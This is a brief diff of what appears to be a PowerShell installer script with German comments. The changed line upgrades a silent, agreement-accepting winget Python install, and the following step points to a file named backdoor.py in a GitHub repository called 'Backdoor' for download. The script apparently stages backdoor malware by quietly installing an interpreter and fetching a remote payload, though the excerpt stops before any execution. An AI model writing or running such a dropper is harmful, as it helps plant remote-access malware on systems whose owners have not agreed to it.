@@ -1,5 +1,5 @@
 # 1. Python installieren (winget, still)
-winget install Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
+winget install Python.Python.3.13 --silent --accept-package-agreements --accept-source-agreements
 
 # 2. Zieldatei von GitHub herunterladen
 $targetUrl = "https://raw.githubusercontent.com/KibaYuuto/Backdoor/main/backdoor.py"
